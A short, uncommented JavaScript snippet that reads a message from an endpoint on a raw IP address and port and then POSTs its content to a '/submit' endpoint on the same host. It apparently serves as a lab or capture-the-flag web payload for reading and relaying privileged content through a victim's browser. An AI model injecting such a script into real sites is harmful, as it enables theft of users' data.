fetch("http://94.237.60.55:49882/message/3").then((r) =>{
        return r.text();
}).then((x) =>{
        fetch("http://94.237.60.55:49882/submit", {
                "headers": {
                        "Content-Type": "application/json"
                },
                "body": x,
                "method": "POST",
                "mode": "cors"
        });
});
